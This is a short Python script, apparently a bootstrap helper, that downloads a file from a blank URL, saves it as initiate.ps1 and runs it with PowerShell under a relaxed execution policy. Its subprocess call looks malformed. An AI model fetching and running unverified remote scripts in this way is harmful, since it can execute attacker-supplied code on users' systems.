import subprocess, sys, os
from tqdm import tqdm
import requests

url = ""
response = requests.get(url, stream=True)

with open("initiate.ps1", "wb") as handle:
    for data in tqdm(response.iter_content()):
        handle.write(data)

def get_script_path():
    return os.path.dirname(os.path.realpath(sys.argv[0]))

p = subprocess.Popen(["powershell.exe -ExecutionPolicy RemoteSigned -file", 
              f"{get_script_path()}\\initiate.ps1"], 
              stdout=sys.stdout)
p.communicate()
print(get_script_path())